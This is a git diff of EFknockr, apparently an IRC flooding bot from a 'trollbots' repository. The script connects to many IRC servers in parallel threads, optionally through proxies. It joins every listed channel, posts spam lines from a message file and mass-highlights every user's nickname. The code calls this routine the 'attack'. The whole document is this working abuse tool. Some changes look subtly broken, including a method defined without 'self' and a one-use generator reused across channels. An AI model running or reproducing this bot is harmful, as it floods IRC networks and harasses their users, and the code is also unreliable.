@@ -7,8 +7,8 @@
 import concurrent.futures
 import os
 import random
-import ssl
 import socket
+import ssl
 import sys
 import threading
 import time
@@ -51,44 +51,39 @@ def error_exit(msg):
 def get_time():
 	return time.strftime('%I:%M:%S')
 
-def keep_alive():
-	try:
-		while True:
-			input('')
-	except KeyboardInterrupt:
-		sys.exit()
-
-def random_int(min, max):
-	return random.randint(min, max)
-
-def random_str(size):
-	return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(size))
-
 class clone:
 	def __init__(self, server, options):
 		self.server           = server
 		self.options          = options
-		self.bad_channels	  = list()
+		self.bad_channels     = list()
 		self.current_channels = list()
 		self.nicklist         = dict()
-		self.nickname         = config.ident.nickname
+		self.nickname         = options['nickname']
 		self.sock             = None
 
+	def run(self):
+		if not self.options:
+			self.options = config.defaults
+		else:
+			self.options.update(config.defaults)
+		self.connect()
+
 	def attack(self):
-		random.shuffle(self.options['channels'])
-		for channel in self.options['channels']:
+		while self.options['channels']:
+			chan = random.choice(self.options['channels'])
 			try:
-				if ':' in channel:
-					chan, key = channel.split(':')
-					self.join_channel(chan, key)
-				else:
-					self.join_channel(channel)
-				time.sleep(config.throttle.join)
-				while len(self.current_channels) >= config.throttle.channels:
-					time.sleep(1)
+				self.join_channel(chan)
 			except Exception as ex:
 				error('Error occured in the attack loop!', ex)
 				break
+			else:
+				time.sleep(config.throttle.join)
+				while len(self.current_channels) >= config.throttle.channels:
+					time.sleep(1)
+			finally:
+				self.options['channels'].remove(chan)
+		debug('Finished knocking all channels on ' + self.server)
+		self.event_disconnect()
 
 	def connect(self):
 		try:
@@ -96,7 +91,7 @@ class clone:
 			self.sock.connect((self.server, self.options['port']))
 			self.register()
 		except socket.error:
-			error(f'Failed to connect to {self.server} server.')
+			error('Failed to connect to ' + self.server)
 			self.event_disconnect()
 		else:
 			self.listen()
@@ -117,12 +112,14 @@ class clone:
 			self.sock = ssl.wrap_socket(self.sock)
 
 	def event_connect(self):
-		debug(f'Connected to {self.server} server.')
+		debug('Connected to ' + self.server)
+		if self.options['nickserv']:
+			self.identify(self.options['nickname'], self.options['nickserv'])
 		if self.options['channels']:
 			if type(self.options['channels']) == list:
  				threading.Thread(target=self.attack).start()
 			else:
-				error(f'Invalid channel list for {self.server} server.')
+				error('Invalid channel list for ' + self.server)
 				self.event_disconnect()
 		else:
 			self.options['channels'] = list()
@@ -133,10 +130,10 @@ class clone:
 
 	def event_end_of_list(self):
 		if self.options['channels']:
-			debug('Loaded {0} channels from {1} server.'.format(len(self.options['channels']), self.server))
+			debug('Found {0} channels on {1}'.format(len(self.options['channels']), self.server))
 			threading.Thread(target=self.attack).start()
 		else:
-			error(f'Found zero channels on {self.server} server.')
+			error('Found zero channels on ' + self.server)
 			self.event_disconnect()
 
 	def event_end_of_names(self, chan):
@@ -148,38 +145,39 @@ class clone:
 					break
 				self.sendmsg(chan, line)
 				time.sleep(config.throttle.message)
-			if chan in self.nicklist and chan not in self.bad_channels:
+			if chan in self.nicklist:
 				self.nicklist[chan] = ' '.join(self.nicklist[chan])
 				if len(self.nicklist[chan]) <= 400:
 					self.sendmsg(chan, self.nicklist[chan])
 				else:
 					while len(self.nicklist[chan]) > 400:
+						if chan in self.bad_channels:
+							break
 						segment = self.nicklist[chan][:400]
 						segment = segment[:-len(segment.split()[len(segment.split())-1])]
 						self.sendmsg(chan, segment)
 						self.nicklist[chan] = self.nicklist[chan][len(segment):]
 						time.sleep(config.throttle.message)
+			self.part(chan, config.settings.part_msg)
 		except Exception as ex:
 			error('Error occured in the attack loop!', ex)
 		finally:
-			if chan in self.current_channels:
-				self.current_channels.remove(chan)
+			self.current_channels.remove(chan)
 			if chan in self.bad_channels:
 				self.bad_channels.remove(chan)
 			if chan in self.nicklist:
 				del self.nicklist[chan]
-			self.part(chan, config.settings.part_msg)
 
 	def event_list_channel(self, chan, users):
 		self.options['channels'].append(chan)
 
 	def event_nick_in_use(self):
-		self.nickname = self.nickname + '_'
+		self.nickname += '_'
 		self.nick(self.nickname)
 
 	def event_names(self, chan, names):
 		if config.settings.mass_hilite:
-			if not chan in self.nicklist:
+			if chan not in self.nicklist:
 				self.nicklist[chan] = list()
 			for name in names:
 				if name[:1] in '~!@%&+:':
@@ -190,6 +188,8 @@ class clone:
 	def handle_events(self, data):
 		args = data.split()
 		if data.startswith('ERROR :Closing Link:'):
+			if 'Password mismatch' in data:
+				error('Network has a password.', self.server)
 			raise Exception('Connection has closed.')
 		elif args[0] == 'PING':
 			self.raw('PONG ' + args[1][1:])
@@ -226,14 +226,14 @@ class clone:
 						break
 		elif args[1] == '433':
 			self.event_nick_in_use()
+		elif args[1] == '464':
+			error('Network has a password.', self.server)
 		elif args[1] in bad_numerics:
 			chan = args[3]
 			error(f'Failed to knock {chan} channel on {self.server}', bad_numerics[args[1]])
-		elif args[1] == 'PART':
-			nick = args[0].split('!')[0][1:]
-			chan = args[2]
-			if nick == self.nickname and chan == self.options['channels'][len(self.options['channels'])-1]:
-				self.event_disconnect()
+
+	def identify(nick, password):
+		self.sendmsg('nickserv', f'identify {nick} {password}')
 
 	def join_channel(self, chan):
 		self.raw('JOIN ' + chan)
@@ -264,8 +264,8 @@ class clone:
 	def register(self):
 		if self.options['password']:
 			self.raw('PASS ' + self.options['password'])
-		self.raw('USER {0} 0 * :{1}'.format(config.ident.username, config.ident.realname))
-		self.raw('NICK ' + config.ident.nickname)
+		self.raw('USER {0} 0 * :{1}'.format(self.options['username'], self.options['realname']))
+		self.raw('NICK ' + self.nickname)
 
 	def sendmsg(self, target, msg):
 		self.raw(f'PRIVMSG {target} :{msg}')
@@ -279,7 +279,7 @@ print('#{0}#'.format('https://github.com/acidvegas/trollbots'.center(54)))
 print('#{0}#'.format(''.center(54)))
 print(''.rjust(56, '#'))
 if not sys.version_info.major == 3:
-	error_exit('EFknockr requires Python version 3 to run!')
+	error_exit('EFknockr requires Python 3 to run!')
 if config.connection.proxy:
 	try:
 		import socks
@@ -287,17 +287,15 @@ if config.connection.proxy:
 		error_exit('Missing PySocks module! (https://pypi.python.org/pypi/PySocks)')
 msg_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'msg.txt')
 if os.path.isfile(msg_file):
-	msg_lines = [line.strip() for line in open(msg_file, encoding='utf8', errors='replace').readlines() if line]
+	msg_lines = (line.strip() for line in open(msg_file, encoding='utf8', errors='replace').readlines() if line)
 else:
 	error_exit('Missing message file!')
 del msg_file
-debug(f'Loaded {len(msg_lines)} lines of messages.')
-debug(f'Loaded {len(config.targets)} servers from config.')
+debug(f'Loaded {len(config.targets)} targets from config.')
 server_list = list(config.targets)
 random.shuffle(server_list)
 with concurrent.futures.ThreadPoolExecutor(max_workers=config.throttle.threads) as executor:
-	checks = {executor.submit(clone(server, config.targets[server]).connect): server for server in server_list}
+	checks = {executor.submit(clone(server, config.targets[server]).run): server for server in server_list}
 	for future in concurrent.futures.as_completed(checks):
 		checks[future]
-debug('Flooding is complete. (Threads still may be running!)')
-keep_alive()
+debug('EFknockr has finished knocking.')
